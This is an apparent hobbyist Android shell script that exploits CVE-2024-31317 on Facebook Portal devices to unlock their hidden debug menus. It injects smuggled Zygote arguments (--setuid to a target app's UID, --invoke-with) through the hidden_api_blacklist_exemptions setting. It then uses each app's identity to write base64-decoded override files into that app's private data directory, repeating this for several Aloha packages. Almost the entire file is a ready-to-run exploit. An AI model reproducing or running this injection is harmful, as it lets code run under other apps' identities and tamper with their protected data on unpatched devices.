#!/system/bin/sh
set -euo pipefail

# Each package that fetches its own MobileConfig (instead of proxying through
# another package) needs enable_mc_prefs set to enable the overrides GUI.
# com.facebook.aloha.system.services additionally needs aloha_debug_settings
# set to show the "Debug (Internal)" settings pane.
#
# Note that the names (android_aloha_device, aloha_debug_settings, etc) are
# ignored by the parser; the numbers are what matter.
OVERRIDES_SYSTEM='{"1512:android_aloha_device":["15: aloha_debug_settings: true"],"20676:portal_mobileconfig":["4: enable_mc_prefs: true"],"_qe_overrides_":[]}'
OVERRIDES_OTHER='{"20676:portal_mobileconfig":["4: enable_mc_prefs: true"],"_qe_overrides_":[]}'

STATUS_FILE='/data/local/tmp/portal-toolkit-status'
PACKAGE_LIST=$(pm list packages -U)

# Usage: install_overrides package overrides
install_overrides() {
	# Pretty ugly way to get the UID, but I can't find a simpler one.
	local uid=$(echo "$PACKAGE_LIST" | sed -n "s/^package:$1 uid://p")
	test -n "$uid" || (echo "Can't find UID for $1" ; false)

	# Base64-encode the file contents to ensure payload has no commas.
	local b64=$(echo "$2" | base64 -w 0)

	echo -n "Overriding $1... "

	# A few things to note about the payload:
	# - We test for app_process64 to prevent the rest from running twice,
	#   since the injection hits both 32-bit and 64-bit Zygotes.
	# - I'm a bit sloppy with quoting to avoid backslash hell, but it should
	#   work fine.
	# - The exploit gives us no good way to see what happened on the other
	#   side, so we add a line to a world-writable temp file if we succeed.
	# - CVE-2024-31317 is way harder to exploit on Android 12+, but luckily
	#   all Portals run Android 9 or 10.
	settings put global hidden_api_blacklist_exemptions "
7
--runtime-args
--setuid=$uid
--setgid=$uid
--runtime-flags=1
--seinfo=default
--invoke-with
f() { test \$1 == /system/bin/app_process64 && echo $b64 | /system/bin/base64 -d >/data/user/0/$1/files/mobileconfig/mc_overrides.json && echo $1 >$STATUS_FILE ; }; f"

	# Unpersist, since we only need to run the payload once.
	settings delete global hidden_api_blacklist_exemptions >/dev/null

	# Wait for it to run.
	sleep 0.5

	if test "$(cat "$STATUS_FILE")" = "$1" ; then
		truncate -s 0 "$STATUS_FILE"
		echo "success"
	else
		truncate -s 0 "$STATUS_FILE"
		echo "failed"
		false
	fi
}

cleanup() {
	rm "$STATUS_FILE"

	echo "Done. Rebooting to restore Zygote function and apply changes..."
	reboot
}

rm -f "$STATUS_FILE"
touch "$STATUS_FILE"
chmod a+w "$STATUS_FILE"
trap cleanup EXIT

# 1. Essentiële systeem services (voor het aanzetten van de Debug menu's)
install_overrides 'com.facebook.aloha.system.services' "$OVERRIDES_SYSTEM"
install_overrides 'com.facebook.alohaservices.alohausers' "$OVERRIDES_OTHER"

# 2. De specifieke apps voor AR, StoryTime en Photos
install_overrides 'com.facebook.aloha.app.storytime' "$OVERRIDES_OTHER"
install_overrides 'com.facebook.aloha.app.photobooth' "$OVERRIDES_OTHER"
install_overrides 'com.facebook.alohaapps.superframe' "$OVERRIDES_OTHER"
install_overrides 'com.facebook.aloha.app.cameraeditor' "$OVERRIDES_OTHER"
